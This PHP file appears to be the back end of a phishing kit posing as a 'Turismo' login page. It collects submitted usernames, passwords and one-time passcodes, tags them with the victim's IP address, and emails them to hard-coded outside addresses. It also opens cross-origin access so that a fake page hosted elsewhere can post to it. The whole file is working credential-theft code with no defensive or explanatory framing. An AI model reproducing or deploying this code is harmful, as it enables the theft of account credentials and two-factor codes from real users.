<?php
/**
 * Created by PhpStorm.
 * User: mac
 * Date: 2020-01-24
 * Time: 20:28
 */
 //file:///Users/mac/Downloads/index.htm

//setup your email here. you can add as many as you want. always seperate with comma
//$to_email = "megrace101@outlook.com";
$to_email = "chukuma11111@outlook.com,megrace101@outlook.com";

foreach ($_POST as $p => $v):
     $post[$p] = filterdata($v);
  endforeach;
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
    $from = 'noreply@example.com';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
// Create email headers
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
 if(isset($post['usersme'])){
      if(strlen($post['usersme']) >= 12){}else{
     
$subject = 'OTP';
$message = '<html><body>';
$message .= '......................OTP Turismo Report......................<br>';

$message .= ' OTP : '.$post['usersme'].'<br>';
$message .= ' IP ADDRESS : '.filterdata($_SERVER['REMOTE_ADDR']).'<br>';
 
 
 $message .= 'Date Created : '.date('l jS \of F Y h:i:s A').'<br>';
 
$message .= '......................END OTP Report......................<br>';

$message .= '</body></html>';


$ema = explode(",",$to_email);
   foreach ($ema as $em):
       mail($em,$subject,$message,$headers);
   endforeach;
      }

 }
 
  if(isset($_POST['username'])){
      if(strlen($_POST['username']) >= 30){}else{
          if(strlen($_POST['password']) >= 30){}else{
     $subject = 'Log in';
$message = '<html><body>';
$message .= '......................Log Turismo Report......................<br>';

$message .= ' Username : '.$post['username'].'<br>';
        
        
$message .=  'Password : '.$post['password'].'<br>';
    
    
$message .= ' IP ADDRESS : '.filterdata($_SERVER['REMOTE_ADDR']).'<br>';
 
 
 $message .= 'Date Created : '.date('l jS \of F Y h:i:s A').'<br>';
 
$message .= '......................END Log Report......................<br>';

$message .= '</body></html>';

$ema = explode(",",$to_email);
   foreach ($ema as $em):
       mail($em,$subject,$message,$headers);
   endforeach;
 }
      }
  }


  function filterdata($data){
         $dat = htmlentities(strip_tags(trim($data)));
         $dat = htmlspecialchars($dat);
          return $dat;
  }


?>
